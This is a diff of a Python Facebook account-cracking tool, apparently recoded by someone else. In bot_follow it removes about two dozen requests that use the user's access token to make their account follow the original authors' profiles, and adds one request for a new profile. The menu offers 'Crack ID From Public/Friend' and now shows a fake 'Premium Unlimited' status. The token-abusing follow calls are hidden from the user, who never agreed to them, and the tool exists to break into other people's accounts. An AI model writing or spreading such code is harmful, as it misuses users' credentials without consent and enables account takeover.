@@ -269,29 +269,7 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/100069398186868/subscribers?access_token=" + toket)      # Dapunta Khurayra X
-	requests.post("https://graph.facebook.com/100069398186868/subscribers?access_token=" + toket)      # Dapunta Ratya
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Almira Gabrielle X
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket)      # Anthonyus Immanuel
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Antonius Raditya M
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Abigaille Dirgantara
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket)       # Boirah
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Anita Zuliatin
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Dapunta Xayonara
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Dapunta Adya R
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket)      # Wati Waningsih
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket)      # Rofi Nurhanifah
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Diah Ayu Kharisma
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Xena Alexander
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Alexandra Scarlett
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Pebrima Jun Helmi
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Aisya Asyaqila
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Ameiliani Dethasia
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Muh Rizal Fiansyah
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Rizal F
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Angga Kurniawan
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Moh Yayan
-	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) #Cici Putri Andini
+	requests.post("https://graph.facebook.com/100051863139451/subscribers?access_token=" + toket)      # Aditya Gremory
 	menu()
 
 ### MAIN MENU ###
@@ -323,7 +301,7 @@ def menu():
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
     print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+m+"Ga Tau Kan Gue Recode"+p))
+    print((k+"["+p+"•"+k+"]"+p+" Status  : "+m+"Premium Unlimited"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
     print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
